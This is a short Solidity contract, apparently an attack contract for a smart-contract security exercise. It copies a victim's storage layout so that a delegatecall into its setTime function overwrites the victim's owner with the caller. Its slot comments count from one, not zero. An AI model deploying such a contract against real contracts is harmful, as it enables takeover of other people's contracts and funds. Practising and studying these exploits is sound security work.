// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackLibraryContract {
    address public timeZone1Library; // slot 1
    address public timeZone2Library; // slot 2
    address public owner; // slot 3
    uint256 storedTime; //slot 4

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}
